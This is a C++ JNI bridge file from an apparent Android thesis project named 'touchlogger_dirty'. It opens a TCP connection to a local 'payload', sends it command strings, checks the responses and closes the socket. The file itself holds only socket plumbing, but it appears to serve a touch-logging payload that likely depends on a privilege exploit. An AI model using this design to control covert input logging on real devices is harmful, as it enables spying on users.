#include <jni.h>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <cerrno>
#include <cstring>

#include "utils/net_utils.h"
#include "common/logging.h"

#define UNUSED __attribute__((unused))

extern "C"
JNIEXPORT jint JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_initPayloadConnection(UNUSED JNIEnv* env,
                                                                             UNUSED jclass type,
                                                                             jint port)
{
  return (jint) init_connection((int) port);
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_writeCommandToTcp(JNIEnv* env,
                                                                         UNUSED jclass type,
                                                                         jint sockFd,
                                                                         jstring command_)
{
  const char* command = env->GetStringUTFChars(command_, nullptr);
  ssize_t written = write_command((int) sockFd, command);
  env->ReleaseStringUTFChars(command_, command);

  if (written == -1)
  {
    LOGV("Unable to write data to socket %d: %s!", (int) sockFd, strerror(errno));
    return (jboolean) false;
  }

  char* returnValue;
  ssize_t readed = read_command((int) sockFd, &returnValue);

  if (readed == -1)
  {
    LOGV("Unable to read response from TCP socket!");
    return (jboolean) false;
  }

  if (strcmp(returnValue, RESPONSE_OK) == 0)
  {
    return (jboolean) true;
  }
  else if (strcmp(returnValue, RESPONSE_ERROR) == 0)
  {
    LOGV("Got error response!");
    return (jboolean) false;
  }
  else
  {
    LOGV("Unknown response: \"%s\"!", returnValue);
    return (jboolean) false;
  }
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_closeTcpSocket(UNUSED JNIEnv* env,
                                                                      UNUSED jclass type,
                                                                      jint sockFd)
{
  return (jboolean) (close_connection((int) sockFd) == 0);
}
